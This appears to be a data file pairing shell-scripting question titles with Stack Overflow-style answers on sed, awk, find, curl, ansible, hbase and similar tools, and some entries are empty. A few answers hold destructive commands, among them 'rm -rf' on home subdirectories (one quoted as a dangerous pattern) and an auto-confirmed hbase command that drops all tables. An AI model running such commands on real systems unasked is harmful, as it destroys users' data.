    "Colored xtrace output": "The introduction of PS0 in Bash 4.4 almost allows us to do what you need; PS0='\\e[0m' writes a reset code to the terminal before each command runs, but unfortunately it's printed before, not after, PS4 is printed, so that's no good. As others have said I don't think you can do what you want today with bash; PS4 simply isn't an expressive enough hook to properly color the command trace, and there's no other hook that fires at the right time.\nDepending on your exact goal, you may be able to use the DEBUG trap instead of -x. It doesn't perfectly replicate -x, but we can get a similar effect.\n$ debug() {\n  # print a '+' for every element in BASH_LINENO, similar to PS4's behavior\n  printf '%s' \"${BASH_LINENO[@]/*/+}\"\n  # Then print the current command, colored\n  printf ' \\e[36m%s\\e[0m\\n' \"$BASH_COMMAND\"\n}\n$ trap debug DEBUG\n$ shopt -s extdebug # necessary for the DEBUG trap to carry into functions\nThis mostly works, though the debug trap doesn't exactly mirror -x's behavior, so the output is a little different. Here's an example:\n$ foo() { bar \"$@\"; }\n$ bar() { printf '%s\\n' \"$@\" | grep baz; }\n$ foo biff bang baz\n+ foo biff bang baz\n++ foo biff bang baz\n++ bar \"$@\"\n+++ bar \"$@\"\n+++ printf '%s\\n' \"$@\"\n+++ grep baz\nbaz\nI'm not immediately certain why the function calls foo and bar print twice, though I think the second entries are the DEBUG trap entering the function, which we might be able to detect and suppress somehow, e.g. by inspecting FUNCNAME or BASH_LINENO. I'll update this answer if I work that out.",
    "How to avoid glob expansion when running a Java app in Eclipse": "The problem looks quite wired:\n*.txt\nfoo.*\nwill NOT be expanded, but\n*\n*.*\n\"*\"\n\"*.*\"\n\\\"*\\\"\n\\\"*.*\\\"\nwill be expanded.\nIt looks like only \"all files\" is expanded, but all other strings (including *) will stay unchanged.\nI'm at the same problem and I use XP and eclipse 3.5.2",
    "Output sar command results to a csv file": "I know this is kind of old but you should, or could, use sadf -dh -- <sar command>. It is part of the sysstat package and it will give you the csv output without any need for awk and regex. Actually, the latest versions are also able to output the info to JSON and XML. You can just pick your poison :)\nSimple example:\n$ sadf -dh -- -p\nlocalhost.localdomain;-1;2014-06-13 08:47:02 UTC;LINUX-RESTART\n# hostname;interval;timestamp;CPU;%user;%nice;%system;%iowait;%steal;%idle[...]\nlocalhost.localdomain;600;2014-06-13 09:00:01 UTC;-1;8.80;0.01;1.65;9.51;0.00;80.03\nlocalhost.localdomain;600;2014-06-13 09:10:01 UTC;-1;3.03;0.71;2.41;0.81;0.00;93.05",
    "when I built my app in xcode,there is an error:/bin/sh: bad interpreter: Operation not permitted": "",
    "String comparison in bash is not working": "try\nif [ \"$os\" = \"GNU/Linux\" ]\nnote the spaces, and the single =.\n[ is actually a program, and the rest are arguments!",
    "Finding duplicate files according to md5 with bash": "Don't reinvent the wheel, use the proper command :\nfdupes -r dir\nSee http://code.google.com/p/fdupes/ (packaged on some Linux distros)",
    "extract date from a file name in unix using shell scripting": "echo abcd_2014-05-20.tar.gz |grep -Eo '[[:digit:]]{4}-[[:digit:]]{2}-[[:digit:]]{2}'      \nOutput:\n2014-05-20\ngrep got input as echo stdin or you can also use cat command if you have these strings in a file.\n-E Interpret PATTERN as an extended regular expression.\n-o Show only the part of a matching line that matches PATTERN.\n[[:digit:]] It will fetch digit only from input.\n{N} It will check N number of digits in given string, i.e.: 4 for years 2 for months and days\nMost importantly it will fetch without using any separators like \"_\" and \".\" and this is why It's most flexible solution.",
    "How to put text in multiple files using command ECHO? [duplicate]": "The tee command copies what it reads from standard input to one or more files, and also writes the data to its standard output. So you can use:\necho my text | tee file1 file2 file3 > /dev/null\nor maybe:\necho my text | tee file1 file2 > file3",
    "Unix convert Month name to number": "mydate=\"Oct 2011\"\ndate --date=\"$(printf \"01 %s\" $mydate)\" +\"%Y-%m\"\nThe parse_datetime interface for GNU date (which is what the example uses) has lots of rules. the Oct 2011 form of the date isn't one of them, so you prepend a \"01 \" to the front of it and date likes it.",
    "Source from string? Is there any way in shell?": "Executing downloads blindly is definitely not something you want to do casually.\nYou can execute the contents of a variable using eval, as in:\neval \"$variable\"\nThat's not something you want to do without thinking through the security implications either.",
    "Capistrano 'Bundle Not Found' Error During Deployment": "To avoide such problem you should have most recent versions of RVM (currently it is 1.13.5) installed in both places: locally and on remote server.\nNext, check if your deploy.rb has\nrequire \"rvm/capistrano\"\nrequire \"bundler/capistrano\"\nThis line is not needed anymore:\n$:.unshift(File.expand_path('./lib', ENV['rvm_path']))\nHope this will help",
    "CakePHP. app/Console/cake: Permission denied for root user": "",
    "How to remove all files NOT ending with certain formats?": "You can use this:\n$ rm !(*.lnx)\n!(pattern-list)\n    Matches anything except one of the given patterns. \n    A pattern-list is a list of one or more patterns separated by a \u2018|\u2019.",
    "Perl one-liner with single quote": "You can't use single quotes alone. You need to escape them correctly using '\\'' This works:\n$ echo \"a,b\" | perl -F',' -lane 'print \"'\\''$F[0]'\\''\";'\n'a'",
    "Watch a file for change": "You could use inotifywait. It waits for changes to a file, and then executes a command (e.g. something like msmtp in your case).",
    "Text alignment center - shell script": "Finally I found the solution:)\nCOLUMNS=$(tput cols) \ntitle=\"Hello world!\" \nprintf \"%*s\\n\" $(((${#title}+$COLUMNS)/2)) \"$title\"",
    "\"Operation not permitted\" when execute shell script in mac app": "For me I had to go to Build Settings -> User Script Sandboxing -> false\nEnable App Sandboxing is a different setting and was already set to false but has no impact on Run Scripts.",
    "adb: Find PID from the adb shell": "",
    "removing duplicated strings within a column with shell": "This awk should work for you:\nawk -F '[\\t,]' '\n{\n   printf \"%s\", $1 \"\\t\"\n   for (i=2; i<=NF; ++i) {\n      if (!seen[$i]++)\n         printf \"%s,\", $i\n   }\n   print \"\"\n   delete seen\n}' file\n\nOG0000000   PF03169,MAC1_004431-T1,\nOG0000002   PF07690,PF00083,\nOG0000003   MAC1_000127-T1,\nOG0000004   PF13246,PF00689,PF00690,\nOG0000005   PF00012,PF01061,PF12697,\nPS: As per the expected output shown this solution also shows a trailing comma in each line.",
    "Send text file, line by line, with netcat": "OP was unclear on whether they needed a new connection for each line. But based on the OP's comment here, I think their need is different than mine. However, Google sends people with my need here so here is where I will place this alternative.\nI have a need to send a file line by line over a single connection. Basically, it's a \"slow\" cat. (This will be a common need for many \"conversational\" protocols.)\nIf I try to cat an email message to nc I get an error because the server can't have a \"conversation\" with me.\n$ cat email_msg.txt | nc localhost 25\n554 SMTP synchronization error\nNow if I insert a slowcat into the pipe, I get the email.\n$ function slowcat(){ while read; do sleep .05; echo \"$REPLY\"; done; }\n$ cat email_msg.txt | slowcat | nc localhost 25\n220 et3 ESMTP Exim 4.89 Fri, 27 Oct 2017 06:18:14 +0000\n250 et3 Hello localhost [::1]\n250 OK\n250 Accepted\n354 Enter message, ending with \".\" on a line by itself\n250 OK id=1e7xyA-0000m6-VR\n221 et3 closing connection\nThe email_msg.txt looks like this:\n$ cat email_msg.txt\nHELO localhost\nMAIL FROM:<system@example.com>\nRCPT TO:<bbronosky@example.com>\nDATA\nFrom: [IES] <system@example.com>\nTo: <bbronosky@example.com>\nDate: Fri, 27 Oct 2017 06:14:11 +0000\nSubject: Test Message\n\nHi there! This is supposed to be a real email...\n\nHave a good day!\n-- System\n\n\n.\nQUIT",
    "Counting folders with Powershell": "In PowerShell 3.0 you can use the Directory switch:\n(Get-ChildItem -Path <path> -Directory -Recurse -Force).Count",
    "how to use shell script checking last changed time of a file": "You can get the last modification time of a file with stat, and the current date with date. You can use format strings for both to get them in \"seconds since the epoch\":\ncurrent=`date +%s`\nlast_modified=`stat -c \"%Y\" $file`\nThen, it's pretty easy to put that in a condition. For example:\nif [ $(($current-$last_modified)) -gt 180 ]; then \n     echo \"old\"; \nelse \n     echo \"new\"; \nfi",
    "Save last working directory on Bash logout": "Save the last working directory in ~./.bash_logout into a hidden file:\npwd > ~/.lastdirectory\nRead this file in ~/.bashrc with\n[ -s ~/.lastdirectory ] && cd `cat ~/.lastdirectory`",
    "Linux: how to move each file into a correspondingly named folder": "Here's your one liner\nfind . -name \"*.abc\" -exec sh -c 'NEWDIR=`basename \"$1\" .abc` ; mkdir \"$NEWDIR\" ; mv \"$1\" \"$NEWDIR\" ' _ {} \\;\nor alternatively\nfind . -name \"*.abc\" -exec sh -c 'mkdir \"${1%.*}\" ; mv \"$1\" \"${1%.*}\" ' _ {} \\;\nAnd this is a better guide at using find than the man page.\nThis page explains the parameter expansion that is going on (to understand the ${1%.*}",
    "Get the newest file based on timestamp": "For those who just want an answer, here it is:\nls | sort -n -t _ -k 2 | tail -1\nHere's the thought process that led me here.\nI'm going to assume the [RANGE] portion could be anything.\nStart with what we know.\nWorking Directory: /incoming/external/data\nFormat of the Files: [RANGE]_[YYYYMMDD].dat\nWe need to find the most recent [YYYYMMDD] file in the directory, and we need to store that filename.\nAvailable tools (I'm only listing the relevant tools for this problem ... identifying them becomes easier with practice):\nls\nsed\nawk (or nawk)\nsort\ntail\nI guess we don't need sed, since we can work with the entire output of ls command. Using ls, awk, sort, and tail we can get the correct file like so (bear in mind that you'll have to check the syntax against what your OS will accept):\nNEWESTFILE=`ls | awk -F_ '{print $1 $2}' | sort -n -k 2,2 | tail -1`\nThen it's just a matter of putting the underscore back in, which shouldn't be too hard.\nEDIT: I had a little time, so I got around to fixing the command, at least for use in Solaris.\nHere's the convoluted first pass (this assumes that ALL files in the directory are in the same format: [RANGE]_[yyyymmdd].dat). I'm betting there are better ways to do this, but this works with my own test data (in fact, I found a better way just now; see below):\nls | awk -F_ '{print $1 \" \" $2}' | sort -n -k 2 | tail -1 | sed 's/ /_/'\n... while writing this out, I discovered that you can just do this:\nls | sort -n -t _ -k 2 | tail -1\nI'll break it down into parts.\nls\nSimple enough ... gets the directory listing, just filenames. Now I can pipe that into the next command.\nawk -F_ '{print $1 \" \" $2}'\nThis is the AWK command. it allows you to take an input line and modify it in a specific way. Here, all I'm doing is specifying that awk should break the input wherever there is an underscord (_). I do this with the -F option. This gives me two halves of each filename. I then tell awk to output the first half ($1), followed by a space (\" \") , followed by the second half ($2). Note that the space was the part that was missing from my initial suggestion. Also, this is unnecessary, since you can specify a separator in the sort command below.\nNow the output is split into [RANGE] [yyyymmdd].dat on each line. Now we can sort this:\nsort -n -k 2\nThis takes the input and sorts it based on the 2nd field. The sort command uses whitespace as a separator by default. While writing this update, I found the documentation for sort, which allows you to specify the separator, so AWK and SED are unnecessary. Take the ls and pipe it through the following sort:\nsort -n -t _ -k 2\nThis achieves the same result. Now you only want the last file, so:\ntail -1\nIf you used awk to separate the file (which is just adding extra complexity, so don't do it sheepish), you can replace the space with an underscore again with sed:\nsed 's/ /_/'\nSome good info here, but I'm sure most people aren't going to read down to the bottom like this.",
    "How to split file on first empty line in a portable way in shell (e.g. using sed)?": "You can use csplit:\necho \"a\nb\nc\n\nd\ne\nf\" | csplit -s - '/^$/'\nOr\ncsplit -s filename '/^$/'\n(assuming the contents of \"filename\" are the same as the output of the echo) would create, in this case, two files named \"xx00\" and \"xx01\". The prefix can be changed from \"xx\" to \"outfile\", for example, with -f outfile and the number of digits in the filename could be changed to 3 with -n 3. You can use a more complex regex if you need to deal with Macintosh line endings.\nTo split a file at each empty line, you can use:\ncsplit -s filename '/^$/' '{*}'\nThe pattern '{*}' causes the preceding pattern to be repeated as many times as possible.",
    "How do I print a field from a pipe-separated file?": "Or just use one command:\ncut -d '|' -f FIELDNUMBER",
    "How to catch timeout/errors in a CURL shell script?": "Execute following as script.sh http://www.google.com/.\n-D - dump headers to file\n-o - write response to file\n-s - be silent\n-w - display value of specified variables\n#!/bin/bash\n\nRESPONSE=response.txt\nHEADERS=headers.txt\n\nstatus=$(curl -s -w %{http_code} $1 -o $RESPONSE)\n\n# or\n#curl -s -D $HEADERS $1 -o $RESPONSE\n#status=$(cat $HEADERS | head -n 1 | awk '{print $2}')\n\necho $status\nUse $status and $RESPONSE for further processing.",
    "Parallel processing or threading in Shell scripting": "GNU Parallel is what you want, unless you want to reinvent the wheel. Here are some more detailed examples, but the short of it:\nls | parallel gzip # gzip all files in a directory",
    "How can I delete contents in a folder using a bash script?": "~ is a shorthand to a current user home directory. So unless it's also your project directory you are doing something wrong. Other than that, clearing a directory would be\nrm -rf ~/bin/*\nAnd if you also want to clear the hidden files\nrm -rf ~/bin/* ~/bin/.[a-zA-Z0-9]*\nMake sure you are not doing\nrm -rf ~/bin/.*\nespecially as root as it will also try to delete the parent directory.\nUPD\nWhy? Since wildcard (*) is interpreted by shell as zero or more characters of any kind the .* will also match . (current directory) and .. (parent directory).",
    "Is there a way to change vim's default mode": "Just add the following line to your vimrc:\nstart\nVim's default mode will be changed to Insert mode. Just press Esc to enter Command mode.",
    "Which shell does a Perl system() call use?": "It's complicated. Perl does not necessarily invoke a shell. Perldoc says:\nIf there is only one scalar argument, the argument is checked for shell metacharacters, and if there are any, the entire argument is passed to the system's command shell for parsing (this is /bin/sh -c on Unix platforms, but varies on other platforms). If there are no shell metacharacters in the argument, it is split into words and passed directly to execvp , which is more efficient.\nSo it actually looks like you would have the arguments passed right to execvp. Furthermore, whether the shell loaded your .bashrc, .profile, or .bash_profile depends on whether the shell is interactive. Likely it isn't, but you can check like this.",
    "Sed replacement not working when using variables [duplicate]": "Try\nfind /home/loni/config -type f -exec sed -i \"s/${PATTERN}/${REPLACEMENT}/g\" {} \\;\ninstead. The ' quotes don't expand variables.",
    "How can I create 1000 files that I can use to test a script?": "for i in {0001..1000}\ndo\n  echo \"some text\" > \"file_${i}.txt\"\ndone\nor if you want to use Python <2.6\nfor x in range(1000):\n    open(\"file%03d.txt\" % x,\"w\").write(\"some text\")",
    "Edit current user's shell with ansible": "I know this is old, but I wanted to post this in case anyone else comes back here looking for advise like I did:\nIf you're running local playbooks, you might not be specifying the user and expecting to change the shell of user you're running the playbook as.\nThe problem is that you can't change the shell without elevating the privileges (become: yes), but when you do - you're running things as root. Which just changes the shell of the root user. You can double check that this is the case by looking at /etc/passwd and seeing what the root shell is.\nHere's my recipe for changing the shell of the user running the playbook:\n- name: set up zsh for user\n  hosts: localhost\n  become: no\n  vars:\n    the_user: \"{{ ansible_user_id }}\"\n  tasks:\n    - name: change user shell to zsh \n      become: yes\n      user:\n        name: \"{{ the_user }}\"\n        shell: /bin/zsh\nThis will set the variable the_user to the current running user, but will change the shell of that user using root.",
    "Changing model field within the Django Shell": "You should save the changes,\ngame = Game.objects.get(name=\"testb\")\ngame.likes = 5\ngame.save()",
    "bash set variable from commandline argument": "The correct assignment is simply the following, with no spaces on either side of the equal sign:\nvar1=$1\nThe command set var1 = $1 actually does the following:\nSets the value of $1 to \"var1\"\nSets the value of $2 to \"=\"\nSets the value of $3 to the original first parameter $1.",
    "I want to use \"awk\" or sed to print all the lines that start with \"comm=\" in a file": "For lines that start with comm=\nsed -n '/^comm=/p' filex\n\nawk '/^comm=/' filex\nIf comm= is anywhere in the line then\nsed -n '/comm=/p' filex\n\nawk '/comm=/' filex",
    "What does -n in if [ -n \"${TEMP_FILE_LIST}\" ] do?": "From help test:\n  -n STRING\n     STRING      True if string is not empty.",
    "What is the closest thing to grep that comes standard on a Windows install?": "findstr:\ndsquery * | findstr \"asdf\"",
    "How to find all files and separate results by comma on Unix?": "Here is one approach for separating the filenames with commas:\nfind . -path '*.yaml' | tr '\\n' ','\nIf the file names do not contain white space, then another approach is:\nIFS=, echo $(find . -path '*.yaml')\nIn the comments, Kojiro suggests a third approach which preserves whitespace:\nfind . -path '*.yaml' -print0 | tr '\\0' ,\nBecause newlines and commas are allowed in file names, this format may lead to confusion. This format should only be used if you know that your files are sensibly named.",
    "Error while unzipping a file in shell script. - need PK compat. v5.1 (can do v4.6)": "Use 7z from p7zip-full package in Debian:\n$ 7z x test.zip",
    "Sed - Replace immediate next string/word coming after a particular pattern": "To replace any value till the end of the line:\nsed -i 's/\\(rmd_ver=\\)\\(.*\\)/\\1R/' file\nsed -i 's/p/r/' file replace p with r in file\n\\( start first group\nrmd_ver= search pattern\n\\) end first group\n\\( start second group\n.* any characters\n\\) end second group\n\\1 back reference to the first group\nR replacement text\nTo replace the exact pattern in any place of the line and possibly several times in one line:\nsed -i 's/\\(rmd_ver=\\)\\(1\\.0\\.10\\)/\\1R/g' file\n\\. escape special . into literal .\ng to replace multiple occurrences in one line",
    "how to use kill SIGUSR2 in bash?": "SIGUSR2 is architecture depended and can have a value out of 31, 12 or 17. This is described in man 7 signal. You'll have to find out which value is appropriate for your system. Usually this is done by having a look into:\n/usr/include/asm/signal.h \nOn my system - Ubuntu 12.04 AMD 64 - it has a value of 12:\n#define SIGUSR2     12\nOnce you know the proper numeric value for SIGUSR2 on your system, you can send this signal using:\nkill -SIGNO PID\n# In this case\nkill -12 PID",
    "Extracting .tar file isn't working": "try the following command:\ntar -xzvf filename.tar.gz",
    "Read input from redirected stdin with python": "As others have mentioned, probably your condition line == '\\n' never holds true. The proper solution would be to use a loop like:\nfor line in sys.stdin:\n  stripped = line.strip()\n  if not stripped: break\n  lines.append(stripped)",
    "GAWK Script - Print filename in BEGIN section": "you can use ARGV[1] instead of FILENAME if you really want to use it in BEGIN block\nawk 'BEGIN{print ARGV[1]}' file",
    "What's a good way to write batch scripts in C#?": "I would try to get over the PowerShell anxiety because it is the shell of the future. All of the software coming out of Microsoft is using it as their management interface and especially version 2.0 is ridiculously useful.\nI'm a C# developer most of the time but PowerShell has solved that whole \"WindowsApplication42\" problem of temp projects just piling up. PowerShell gives you full access to the .NET framework in a command line shell so even if you don't know how to do something in PowerShell, you most likely know how to do it in .NET.",
    "How to download Dash video files as they appear on the server?": "No need to develop a wheel!\nThe grand tool youtube-dl knows hundreds of platforms/protocols/etc as well as MPEG DASH as well as Apple HLS and so on and so forth! Very often updates/bugfixes\nHave fun!\nhttp://rg3.github.io/youtube-dl/\nPS.: If you want to keep fragments - use the option\n--keep-fragments                 \nKeep downloaded fragments on disk after downloading is finished; fragments are erased by default\nUpd:\nYour playlist has plenty of options (based on video bandwidth), eg:\nyoutube-dl.exe -F https://dash.akamaized.net/akamai/bbb_30fps/bbb_30fps.mpd\n[generic] bbb_30fps: Requesting header\nWARNING: Falling back on generic information extractor.\n[generic] bbb_30fps: Downloading webpage\n[generic] bbb_30fps: Extracting information\n[info] Available formats for bbb_30fps:\nformat code                 extension  resolution note\nbbb_a64k                    m4a        audio only DASH audio   67k , m4a_dash container, mp4a.40.5 (48000Hz)\nbbb_30fps_320x180_200k      mp4        320x180    DASH video  254k , mp4_dash container, avc1.64000d, 30fps, video only\nbbb_30fps_320x180_400k      mp4        320x180    DASH video  507k , mp4_dash container, avc1.64000d, 30fps, video only\nbbb_30fps_480x270_600k      mp4        480x270    DASH video  759k , mp4_dash container, avc1.640015, 30fps, video only\nbbb_30fps_640x360_800k      mp4        640x360    DASH video 1013k , mp4_dash container, avc1.64001e, 30fps, video only\nbbb_30fps_640x360_1000k     mp4        640x360    DASH video 1254k , mp4_dash container, avc1.64001e, 30fps, video only\nbbb_30fps_768x432_1500k     mp4        768x432    DASH video 1883k , mp4_dash container, avc1.64001e, 30fps, video only\nbbb_30fps_1024x576_2500k    mp4        1024x576   DASH video 3134k , mp4_dash container, avc1.64001f, 30fps, video only\nbbb_30fps_1280x720_4000k    mp4        1280x720   DASH video 4952k , mp4_dash container, avc1.64001f, 30fps, video only\nbbb_30fps_1920x1080_8000k   mp4        1920x1080  DASH video 9914k , mp4_dash container, avc1.640028, 30fps, video only\nbbb_30fps_3840x2160_12000k  mp4        3840x2160  DASH video 14931k , mp4_dash container, avc1.640033, 30fps, video only (best)\nnow, if you wish you download ALL the segments for all the bitrates, you could try to use the magic option\n--all-formats\nor you could do it one by one using the --format option, e.g.:\nyoutube-dl.exe --format bbb_30fps_320x180_200k --keep-fragments ",
    "How to select a particular column in linux df command": "You can for example say:\ndf --output=source,avail\nOr as commented by Tim Bunce, you can use --direct to prevent the long filesystem name make the line split in two. This will show the filesystem as -.\nFrom man df:\n--output[=FIELD_LIST]\nuse the output format defined by FIELD_LIST, or print all fields if FIELD_LIST is omitted.\n...\nFIELD_LIST is a comma-separated list of columns to be included. Valid field names are: 'source', 'fstype', 'itotal', 'iused', 'iavail', 'ipcent', 'size', 'used', 'avail', 'pcent' and 'target' (see info page).\n--direct\nshow statistics for a file instead of mount point\nTest\n$ df --output=source,avail\nFilesystem               Avail\n/dev/sda7            321675536",
    "How to redirect the telnet console logs to a file Linux": "You can do it by using the tee command:\ntelnet $someIp | tee -a -i someFile",
    "Cleaner way to write multiple sed commands?": "Since the patterns to be matched are similar, you could make use of alternation for the 4 strings and capture it. Make the # at the beginning of the string optional.\nThe following would combine those into one:\nsed -i -r 's/^#?(PermitRootLogin|PermitEmptyPasswords|PasswordAuthentication|X11Forwarding) yes/\\1 no/' /etc/ssh/sshd_config\nIf your version of sed doesn't support extended regular expressions, you could say:\nsed -i 's/^#\\{0,1\\}\\(PermitRootLogin\\|PermitEmptyPasswords\\|PasswordAuthentication\\|X11Forwarding\\) yes/\\1 no/' /etc/ssh/sshd_config",
    "Splitting a large txt file into 200 smaller txt files on a regex using shell script in BASH": "awk '/[0-9]+ of [0-9]+ DOCUMENTS/{g++} { print $0 > g\".txt\"}' file\nOSX users will need gawk, as the builtin awk will produce an error like awk: illegal statement at source line 1\nRuby(1.9+)\n#!/usr/bin/env ruby\ng=1\nf=File.open(g.to_s + \".txt\",\"w\")\nopen(\"file\").each do |line|\n  if line[/\\d+ of \\d+ DOCUMENTS/]\n    f.close\n    g+=1\n    f=File.open(g.to_s + \".txt\",\"w\")\n  end\n  f.print line\nend",
    "Connecting input _and_output between of two commands in shell/bash": "How about a named pipe?\n# mkfifo foo\n# A < foo | B > foo\n# rm foo\nFor your second part I believe tee is the correct answer. So it becomes:\n# A < foo | tee logfile | B > foo",
    "Find whether file exists or not in HDFS using shell script": "You can try -test option to achieve the same.\nhdfs dfs -test -[defszrw] HDFS_PATH\n-d: if the path is a directory, return 0.\n-e: if the path exists, return 0.\nSince 2.7.0\n-f: if the path is a file, return 0.\n-s: if the path is not empty, return 0.\n-r: if the path exists and read permission is granted, return 0.\nsince 2.8.0\n-w: if the path exists and write permission is granted, return 0.\n-z: if the file is zero-length, return 0.\nExample:\nif hdfs dfs -test -e $HDFS_PATH; then\n    echo \"[$HDFS_PATH] exists on HDFS\"\n    hdfs dfs -ls $HDFS_PATH\nfi\nReference: https://hadoop.apache.org/docs/current/hadoop-project-dist/hadoop-common/FileSystemShell.html#test",
    "Shell script for executing hbase commands - Deleting all hbase tables": "I use the following:\n#!/bin/sh\necho -e \"disable_all '.*'\\ny\" | hbase shell -n\necho -e \"drop_all '.*'\\ny\" | hbase shell -n\nThe -e flag to echo causes it to process escape sequences so you can build the confirmation into it. The -n tells hbase shell this is a non-interactive session.",
    "How to use shell builtin function from a Makefile?": "The reason you're getting this error is that make (GNU make in particular) tries to perform a number of optimizations. One of those is that if the command appears to be a simple command that does not require the shell, then make will simply invoke it directly via fork/exec and not run a shell. If the command only exists as a shell built-in, then this will not work. Your command line ulimit -c 10000 is a simple command and ulimit is not defined as only a shell-builtin that make knows about, so make will try to fork/exec ulimit directly. So a way to get around your immediate issue is to simply add a character that's special to the shell (the most obvious one is ;), which will hint to make that this command needs to be sent to the shell.\nHowever, this will not work for you.\nExactly contrary to H2CO3's comment above: How possibly could it be [a shell builtin], given the functionality it provides? the real question you have to ask yourself is the opposite: how possibly could it NOT be one, given the functionality it provides? The man page for ulimit clearly states: The ulimit utility shall set or report the file-size writing limit imposed on files written by the shell and its child processes, and further: Since ulimit affects the current shell execution environment, it is always provided as a shell regular built-in.\nYou have to remember that it's virtually impossible for a process in UNIX to modify ANY aspect of its parent process. It can only modify itself, or any child processes that it invokes. This includes the environment variables, working directory, and it also includes ulimit settings.\nSo, good, how does this apply to your situation? You have to remember that each logical line in a make recipe is invokes in a separate shell. So for a command like:\ncore: myprogram\n        ulimit -c 10000 ;\n        ./myprogram\n        ulimit -c 0 ;\n(adding the semicolons to force a shell) what make basically invokes is this:\ncore: myprogram\n        /bin/sh -c 'ulimit -c 10000 ;'\n        /bin/sh -c './myprogram'\n        /bin/sh -c 'ulimit -c 0 ;'\nAs you can see, each ulimit is invoked in its own shell, so it's effectively useless. It will modify the core file size limit for that shell, then the shell exits and the change is lost, then your program is invoked in a new shell with the original ulimit, then a third shell is invoked and ulimit for cores is set to 0 (also useless).\nWhat you need to do is put all of these commands on a single logical line, like this:\ncore: myprogram\n        ulimit -c 10000; ./myprogram\n(you don't need to set the limit back, because the shell will exit anyway).\nAs a side note, this is why make doesn't worry too much about these shell builtins. A builtin like this is basically impossible to use to any effect in a context where you don't need to use some special shell character like a semicolon.",
    "Is there an inline-if with assignment (ternary conditional) in bash? [duplicate]": "Just write:\nfileName=${customName:-$defaultName}.txt\nIt's not quite the same as what you have, since it does not check useDefault. Instead, it just checks if customName is set. Instead of setting useDefault when you want to use the default, you simply unset customName.",
    "getting info from plutil": "",
    "Cannot Import Python MySQL module when running a script using crontab": "It may be that you're using a different Python executable. On the shell, enter which python to find out where the Python executable is located. Let's say this returns something other than /usr/bin/python, say /home/myuser/bin/python, then in the first line of your script, you would write:\n#!/home/myuser/bin/python\nIt may also be that your shell has environment variable called PYTHONPATH. If that's the case and you find where it's importing the library from, then this is how you would add the path to find the library in the first line of your script, before the import of \"MySQLdb\":\nimport sys; sys.path.append('/path/to/MySQLdb-lib/')",
    "How to add .xml extension to all files in a folder in Unix/Linux": "",
    "$$ in a script vs $$ in a subshell": "I tried and escaping (to pass the $$ to the subshell) does not work as the subshell inherits the $$ value from the parent bash. The solution to this is to use $BASHPID.\n(echo $$; echo $BASHPID)\nprints the PID from the parent shell and from the subshell.",
    "Getting exit status code from 'ftp' command in linux shell": "You should be looking for success message from ftp command rather than looking for a status. It's \"226 Transfer complete\". You can confirm it with ftp manual on your system.\n200 PORT command successful.\n150 Opening ASCII mode data connection for filename.\n226 Transfer complete.\n189 bytes sent in 0.145 seconds (0.8078 Kbytes/s)\nHere's a sample script.\nFTPLOG=/temp/ftplogfile\nftp -inv <<! > $FTPLOG\nopen server\nuser ftp pwd\nput filename\nclose\nquit\n!\n\nFTP_SUCCESS_MSG=\"226 Transfer complete\"\nif fgrep \"$FTP_SUCCESS_MSG\" $FTPLOG ;then\n   echo \"ftp OK\"\nelse\n   echo \"ftp Error: \"$OUT\nfi\nexit 0",
    "Shell script to stop a java program": "following up on Mnementh' suggestion:\nthis should do the job\njps -l | grep org.example.MyMain | cut -d ' ' -f 1 | xargs -rn1 kill\njps -l: list java process with \"full package name for the application's main class or the full path name to the application's JAR file.\"\ngrep: choose the process you like\ncut -d -' ' -f 1: split the output in columns using delimiter ' ' and print only the first one (the pid)\nxargs -rn1 kill: execute kill for each PID (if any)\nnote that you must run jps and xargs with the same user (or root) as you're running the process",
    "How do I silence the HEAD of a curl request while using the silent flag?": "Try this:\ncurl --silent \"www.site.com\" > file.txt\nIf you wish, you can use the shorthand -s.",
    "Shell: How to cut a single string with \"Cut\"?": "You can use Here Strings in BASH:\ncut -d' ' -f1 <<< \"hello 12345 xyz\"\nhello",
    "Removing '-' on linux md5sum": "#!/bin/bash\n\nread Test\nPassword=$(echo -n \"$Test\" | md5sum | cut -d' ' -f1)\necho \"\"\nif [ $Password = \"d41d8cd98f00b204e9800998ecf8427e\" ]; then\n      clear\n      echo \"WhOop WHOop\"\nelse\n      echo \":(\"\nfi",
    "How to add an icon to the bash prompt": "Actually, Yes, you can.\nIn recent versions of Bash, at least 4 (i could do it in 4.2 and 4.3), you can render emoji with the hex.\nUse the echo -e flag.\npaste an emoji you looked up in and do a hexdump to see what it's made of:\nplasmarob ~ $ echo -n \"\ud83c\uddfa\ud83c\uddf8\"| hexdump\n\n0000000 f0 9f 87 ba f0 9f 87 b8                        \n0000008\nAnd then take that top line and escape each hex pair with \\x :\nplasmarob ~ $ echo -e 'See? \\xf0\\x9f\\x87\\xba\\xf0\\x9f\\x87\\xb8'\nSee? \ud83c\uddfa\ud83c\uddf8\nI actually modified mine to be:\nplasmarob ~ \u26a1\nSo yes, come up with one like this and try adding it to your .bashrc or .bash_profile.\nEdit: Something with SO or browser rendering may have changed because the flag in this post now renders as a \"US\" character. YMMV but i assume it will still work in the stated versions of bash.",
    "How to set the TMPDIR environment variable to another directory?": "I was able to get it done using that code bellow:\n$ export TMPDIR=~/tmp-ffmpeg\n\n$ mkdir $TMPDIR\n\n$ ./configure \\\n  --enable-gpl \\\n  --enable-version3 \\\n  --enable-shared \\\n  --enable-nonfree \\\n  --enable-postproc \\\n  --enable-libfaac \\\n  --enable-libmp3lame \\\n  --enable-libopencore-amrnb \\\n  --enable-libopencore-amrwb \\\n  --enable-libtheora \\\n  --enable-libvorbis \\\n  --enable-libvpx \\\n  --enable-libx264 \\\n  --enable-libxvid \\\n  --enable-x11grab \\\n  --extra-cflags=\"-I/usr/local/include\" \\\n  --extra-ldflags=\"-L/usr/local/lib\"\n\n$ make\n$ make install\n$ rm -rf $TMPDIR\n$ unset TMPDIR\nThere is also mktemp(1) command. So that you can set TMPDIR as follows:\n$ TMPDIR=\"$(mktemp -d -q ~/tmp/tmp.XXXXX)\"\n$ echo $TMPDIR\n/home/marcelo/tmp/tmp.I8V9H\nThis should work for GNU coreutils as well as for BSD (macOs, FreeBSD, etc). Also note, you not need to export TMPDIR and then unset it. Instead try to pass variable directly to configure:\n$ TMPDIR=\"/foo/bar/baz\" ./configure ...\nHope it helps somebody else ;-)",
    "bash shell script two variables in for loop": "If you are depending on the two directories to match up based on a locale sorted order (like your attempt), then an array should work.\nim1_files=(~/prev1/*.png)\nim2_files=(~/prev3/*.png)\n\nfor ((i=0;i<=${#im1_files[@]};i++)); do\n   run_black.sh \"${im1_files[i]}\" \"${im2_files[i]}\"\ndone",
